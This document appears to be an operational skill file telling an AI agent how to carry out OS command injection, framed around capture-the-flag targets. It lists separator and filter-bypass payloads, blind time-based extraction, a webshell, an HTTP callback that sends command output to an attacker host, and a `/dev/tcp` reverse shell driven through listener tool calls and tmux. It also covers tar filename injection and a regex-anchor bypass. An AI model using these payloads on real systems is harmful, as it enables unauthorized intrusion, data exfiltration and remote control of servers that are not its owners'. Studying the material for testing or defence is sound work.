---
name: command-injection-methodology
description: "OS command injection detection, exploitation, blind injection, and output bypass. Use when the target has network utilities such as Ping, Traceroute, or DNS lookup, or passes parameters into shell commands. Includes a complete separator list, output filter bypass strategies, and regex matching forgery techniques"
zh-signals: "操作系统命令注入的检测、利用与盲注外带，包含分隔符、输出过滤绕过与正则伪造技巧。信号:命令注入,RCE,盲注,输出绕过,Ping"
when-to-use: "Use when a target exposes network utilities such as Ping, Traceroute, or DNS lookup, or passes parameters into shell commands, and you suspect OS command injection."
metadata:
  tags: "command injection,command_injection,rce,os-injection,os injection,ping,blind,output-filter,parser-bypass,os-command-injection,command-execution,blind command,time-based,OOB"
  category: "exploit"
---

# Complete Command Injection Methodology


## Phase 1: Injection Point Discovery
Features commonly vulnerable to command injection: Ping utilities, DNS lookups, file operations, network diagnostics, system information pages
Common parameter names: `ip`, `host`, `cmd`, `command`, `exec`, `ping`, `query`, `domain`, `address`, `ip_address`

## ⛔ In-Depth Reference (Must Read When Bypassing Filters)

- Space / keyword / encoding bypass compendium, Windows injection, output filter bypass → [references/injection-bypass.md](references/injection-bypass.md)

## Phase 2: Basic Injection Testing (By Priority)
**Use `response_diff` to compare normal vs. injected responses and quickly locate the injection point**
1. Semicolon: `127.0.0.1;id`
2. Newline: `%0aid` (**most reliable, usually not filtered**)
3. Pipe: `127.0.0.1|id`
4. AND/OR: `127.0.0.1 && id` / `127.0.0.1 || id`
5. Substitution: `` 127.0.0.1`id` `` / `127.0.0.1$(id)`

## Phase 3: Filtered Character Detection
Test `< > | & ; $ \` ( ) { } [ ]` one by one:
- `|` is filtered → use `;` or `%0a`
- `;` is filtered → use the `%0a` newline
- `>` is filtered → redirection is impossible, exfiltrate with other means

## Phase 4: Exfiltration When Output Is Filtered (Core)
Put `%0a` at the very front so the original command fails and only your echo output remains:
```
ip_address=%0aecho "$(cat /FLAG.txt) packets transmitted, 0 received, 100% packet loss"
```
→ More exfiltration methods (writing files, time-based blind injection) → [references/injection-bypass.md](references/injection-bypass.md)

### Blind Injection Extraction Techniques
- Linux is case-sensitive, so you must try all case combinations of the path
- Character-by-character extraction: `cut -c N`, awk, substr in a per-character loop
- Script it automatically: `if [ $(cut -c1 /flag) = 'F' ]; then sleep 2; fi` — conditional sleep boolean blind injection
- Toolchain: `127.0.0.1;cat /flag` for concrete payload command concatenation
- Use a bash or python script to automate the extraction

## Phase 5: Flag Path Enumeration
⛔ When fixed paths fail you must use `find` to search the system!
```
/flag, /FLAG, /flag.txt, /FLAG.txt, /app/flag.txt
%0afind / -name "*flag*" -o -name "*FLAG*" 2>/dev/null
env | grep -i flag    # environment variables
cat /Dockerfile       # confirm the path
```

## Phase 6: Advanced Bypass Quick Reference
- Spaces: `${IFS}`, `%09`, `{cat,/flag}`
- Keywords: `c'a't /flag`, `tac /flag`, `/bin/ca? /flag`
- Encoding: `echo Y2F0IC9mbGFn | base64 -d | sh`
- Wildcards: `cat /fla*`, `cat /FL?G.txt`

→ Complete bypass checklist (including Windows) → [references/injection-bypass.md](references/injection-bypass.md)

## Interaction Strategy After RCE
Once you have command execution, prefer a method that **requires no persistent interaction**:

| Priority | Method | Applicable Scenario |
|--------|------|----------|
| 🥇 | Direct command output (`; cat /flag`) | Injection with output feedback |
| 🥈 | Webshell (write a php/jsp file and interact over HTTP) | Web target with write permission |
| 🥉 | HTTP callback (`curl http://attacker/?d=$(cmd\|base64)`) | Blind RCE |
| 4 | Reverse shell → `interactive_session` | Sustained interaction needed (su/sudo/file system exploration) |

If you really need a reverse shell (for example to escalate privileges, to `su` into another user, or to reach a database), use the `interactive_session` tool:
```
1. interactive_session action="start" session_name="listener" command="nc -lvp 4444" wait=2
2. Trigger the reverse shell through the injection: ; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
3. interactive_session action="read" session_name="listener"  — confirm the connection
4. interactive_session action="send" session_name="listener" command="id"  — execute a command
5. interactive_session action="send" session_name="listener" command="cat /flag.txt"
6. interactive_session action="close" session_name="listener"  — close when done
```

### Fallback: Bash + tmux Manual Interaction
If the `interactive_session` tool is unavailable (older MCP versions, etc.), use Bash to drive tmux directly for the same result:

```bash
# 1. Start a tmux session running the listener
tmux new-session -d -s listener -x 200 -y 50 "nc -lvp 4444"

# 2. Trigger the reverse shell (through injection or another method)

# 3. Read the screen contents (check whether the callback arrived)
tmux capture-pane -t listener -p -S -100

# 4. Send a command
tmux send-keys -t listener "id" Enter
sleep 2
tmux capture-pane -t listener -p -S -50

# 5. Continue the interaction
tmux send-keys -t listener "cat /flag.txt" Enter
sleep 2
tmux capture-pane -t listener -p -S -50

# 6. Send Ctrl-C (interrupt the current command)
tmux send-keys -t listener C-c

# 7. Close the session
tmux kill-session -t listener
```

→ The three core commands: `tmux new-session -d` (start), `tmux send-keys` (send a command), `tmux capture-pane -p` (read the screen). This pattern works with **any interactive program** — not just nc, but SSH, mysql, redis-cli, python REPL, and so on.

---

## CTF Command Injection Technique Addendum

### Bash Brace Expansion (When Spaces Are Filtered)
When spaces, `$`, `|` and friends are filtered, use brace expansion instead:
```bash
{ls,-la,/}       # equivalent to: ls -la /
{cat,/flag.txt}  # equivalent to: cat /flag.txt
```

### Tar Filename Injection
When the server extracts a tar archive and prints the filenames, shell metacharacters inside a filename get executed:
```bash
touch 'name; cat /flag #' && tar cf exploit.tar *
```

### Regex Missing the `$` Anchor Bypass
`preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/', $ip)` lacks the trailing `$` anchor, so appending a command is enough:
```
127.0.0.1; cat /flag.txt
```
